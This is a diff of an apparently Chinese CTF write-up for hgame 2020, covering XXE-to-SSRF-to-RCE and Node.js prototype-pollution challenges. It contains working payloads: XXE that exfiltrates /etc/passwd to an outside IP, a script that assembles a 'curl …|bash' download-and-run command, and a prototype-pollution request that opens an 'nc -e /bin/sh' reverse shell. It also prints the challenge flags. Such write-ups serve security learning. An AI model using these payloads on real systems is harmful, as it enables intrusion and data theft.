@@ -736,15 +736,15 @@ eval(%22document.body.append\103hild(iframe)%22)%3b</scrscrscriptiptipt></body>"
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
+<!ENTITY % sp SYSTEM "http://39.108.164.219:60005/evil.xml">
 %sp;
 %param1;
 ]>
 <r>&exfil;</r>
 
-File stored on http://127.0.0.1/dtd.xml
+File stored on http://39.108.164.219/evil.xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://39.108.164.219:60005/?a=%data;'>">
 ```
 
 
@@ -790,6 +790,8 @@ echo $result;
 
 
 
+
+
 config.php
 
 ```php
@@ -809,9 +811,325 @@ $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
 原本想着用gopher执行sql语句,但是有密码无法执行
 
-PDO配置错误?
+我我我我是个dsb,明明知道可能是内网有可能由其他主机,但就是不试一下
 
-宽字节注入?(x)
+
+
+
+
+```
+IP address       HW type     Flags       HW address            Mask     Device
+172.21.0.5       0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.1       0x1         0x2         02:42:f7:6e:6f:34     *        eth0
+172.21.0.6       0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.2       0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.32      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.75      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.7       0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.76      0x1         0x2         02:42:ac:15:00:4c     *        eth0
+172.21.0.30      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.77      0x1         0x0         00:00:00:00:00:00     *        eth0
+
+```
+
+```
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::0	ip6-localnet
+ff00::0	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+172.21.0.76	hgame-private
+172.21.0.31	f9f1b9b99e13
+```
+
+发现一个内网服务器`172.21.0.76`
+
+当尝试访问80端口时,发现文件太大等一系列问题
+
+>使用libxml读取文件时,文件不能太大否则会报错
+
+于是尝试压缩能不能读取
+
+```
+<?php
+	error_reporting(0);
+	file_put_contents("tmp",base64_decode(str_replace(' ','+',$_GET['a'])));
+	$a=file_get_contents("php://filter/read=zlib.inflate/resource=tmp");
+	file_put_contents("mes/".date("h_m_s").".txt",$a);
+?>
+
+```
+
+
+
+```
+<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=http://172.21.0.76">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://39.108.164.219:60005/?a=%data;'>">
+```
+
+
+
+```php
+<?php
+error_reporting(0);
+
+$token = @$_GET['token'];
+if (!isset($token)) {
+    die("请带上您的队伍token访问! /?token=");
+}
+$api = "http://checker/?token=".$token;
+$t = file_get_contents($api);
+if($t !== "ok") {
+    die("队伍token错误");
+}
+
+highlight_file(__FILE__);
+
+$sandbox = '/var/www/html/sandbox/'. md5("hgame2020" . $token);;
+@mkdir($sandbox);
+@chdir($sandbox);
+
+$content = $_GET['v'];
+if (isset($content)) {
+    $cmd = substr($content,0,5);
+    system($cmd);
+}else if (isset($_GET['r'])) {
+    system('rm -rf ./*');
+}
+
+/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _
+  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |
+ | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |
+  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |
+  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|
+ |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)
+                                    |/
+
+*/
+```
+
+
+
+然后利用 [https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/](https://err0rzz.github.io/2017/11/13/ctf命令执行与绕过/) 
+
+的方法来执行命令
+
+```php
+
+<?php
+    $a=file_get_contents("tmp.xml");
+    $command=array(
+    '>ls\\\\', 
+    'ls>_', 
+    '>\\ \\\\', 
+    '>-t\\\\', 
+    '>\\>g', 
+    'ls>>_',
+
+    ">bash",
+    ">\\|\\\\",
+    ">5\\\\",
+    ">00\\\\",
+    ">60\\\\",
+    ">9:\\\\",
+    ">21\\\\",
+    ">4.\\\\",
+    ">16\\\\",
+    ">8.\\\\",
+    ">10\\\\",
+    ">9.\\\\",
+    ">3\\\\",
+    ">\\ \\\\",
+    ">rl\\\\",
+    ">cu\\\\"
+    );
+    foreach($command as $v)
+    {
+        echo $v."\n";
+        $v=urlencode($v);
+        file_put_contents("evil.xml",str_replace("TGT",$v,$a));
+        $postdata=<<<MRK
+<?xml version="1.0" ?>
+<!DOCTYPE msg [
+<!ELEMENT msg ANY >
+<!ENTITY % sp SYSTEM "http://39.108.164.219:60005/evil.xml">
+%sp;
+%param1;
+]>
+<msg><id>&exfil;</id><name>b</name><level>c</level><time>d</time></msg>
+MRK;
+        $opts = array('http' => 
+        array( 'method'  => 'POST',
+        'header'  => 'Content-type: application/x-www-form-urlencoded',
+        'content' => $postdata ) 
+    );
+        $context = stream_context_create($opts);
+        file_get_contents("http://bdctr.hgame.day-day.work/submit.php", false, $context);
+        
+    }
+
+
+?>
+
+```
+
+
+
+在经历一次rm -rf 之后,终于拿到getshell
+
+![image.png](https://i.loli.net/2020/02/17/IDFPmldJKNhEHt7.png)
+
+
+
+
+
+
+
+
+
+`hgame{XxE!@SsrF_4nD_f1lt3rEd_Rc3_1s_Co0l!}`
+
+
+
+### sekiro
+
+刚拿到题目的时候,我心态被第一题搞崩了,随便看了一下,就溜去打游戏了,看了wp,艹
+
+
+
+拿到题目,是我不熟悉的nodejs
+
+影响不大,看个大概就会了
+
+`\route\index.js`
+
+```javascript
+router.post('/action', function (req, res) {
+  if (!req.session.sekiro) {
+    res.end("Session required.")
+  }
+  if (!req.session.sekiro.alive) {
+    res.end("You dead.")
+  }
+  var body = JSON.parse(JSON.stringify(req.body));//原型链污染起点
+  var copybody = clone(body)
+  if (copybody.solution) {
+    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)
+  }
+  res.end("提交成功"+JSON.stringify(req.body))
+})
+```
+
+
+
+在注释处有一个奇怪的操作,转成json再转成解析成obj
+
+这摆明了有问题,遇到`JSON.parse+merge` ,思路可以往原型链污染上走一走
+
+我们继续阅读代码
+
+跟进dealWithAttacks
+
+```javascript
+this.dealWithAttacks = function (sekiro, solution) {
+        if (sekiro.attackInfo.solution !== solution) {
+            sekiro.health -= sekiro.attackInfo.attack
+            if (sekiro.attackInfo.additionalEffect) {
+                var fn = Function("sekiro", sekiro.attackInfo.additionalEffect + "\nreturn sekiro")
+                sekiro = fn(sekiro)//look this
+            }
+        }
+        sekiro.posture = (sekiro.posture <= 500) ? sekiro.posture : 500
+        sekiro.health = (sekiro.health > 0) ? sekiro.health : 0
+        if (sekiro.posture == 500 || sekiro.health == 0) {
+            sekiro.alive = false
+        }
+        return sekiro
+    }
+```
+
+
+
+```javascript
+var fn = Function("sekiro", sekiro.attackInfo.additionalEffect + "\nreturn sekiro")
+                sekiro = fn(sekiro)
+```
+
+明显的代码执行,如果我们能控制`sekiro.attackInfo.additionalEffect`,那么便可以执行任意代码了
+
+我们看一下`sekiro.attackInfo.additionalEffect `是如何获得的
+
+```javascript
+this.attacks = [
+        {
+            "method": "连续砍击",
+            "attack": 1000,
+            "additionalEffect": "sekiro.posture+=100",
+            "solution": "连续格挡"
+        },
+        {
+            "method": "普通攻击",
+            "attack": 500,
+            "additionalEffect": "sekiro.posture+=50",
+            "solution": "格挡"
+        },
+        {
+            "method": "下段攻击",
+            "attack": 1000,
+            "solution": "跳跃踩头"
+        },
+        {
+            "method": "突刺攻击",
+            "attack": 1000,
+            "solution": "识破"
+        },
+        {
+            "method": "巴之雷",
+            "attack": 1000,
+            "solution": "雷反"
+        },
+    ]
+    this.getAttackInfo = function () {
+        return this.attacks[Math.floor(Math.random() * this.attacks.length)]
+    }
+```
+
+是从`attacks`中随机挑一个拿出来的,而其中某些是没有`additionalEffect`属性的
+
+根据js根据原型链来查找属性的特性
+
+我们可以用原型链污染来修改Object的additionalEffect属性
+
+payload:
+
+```
+POST /action HTTP/1.1
+Host: sekiro.hgame.babelfish.ink
+Content-Length: 169
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Referer: http://sekiro.hgame.babelfish.ink/
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=s%3A1PZpvTS3HgeMcmNynPUdu4Yd8B4A7Rlt.c2nTB%2F99oXNjyJljMJ0HZugi0SJnsE4juq2ZboRTH0g
+Connection: close
+
+{"solution":123,"__proto__":{"additionalEffect":"global.process.mainModule.constructor._load('child_process').exec('nc 39.108.164.219 60000 -e /bin/sh',function(){});"}}
+```
+
+content-type要设置成`Content-Type: application/json`
+
+不然`__proto__`是无法当初键的,那么merge也就没用了
+
+
+
+
+
+`hgame{j@v4scr1pt_pr0t0tYp3-poLLut1on_4tt4ck_1s_d@ng3r20us}`
 
 
 
@@ -856,6 +1174,8 @@ print(result)
 ```
 
 于是拿到密码(HIDDENINTHEDOC),但是还没到头!!!!!百度一下word隐写,最后拿到flag
+
+
 
 
 
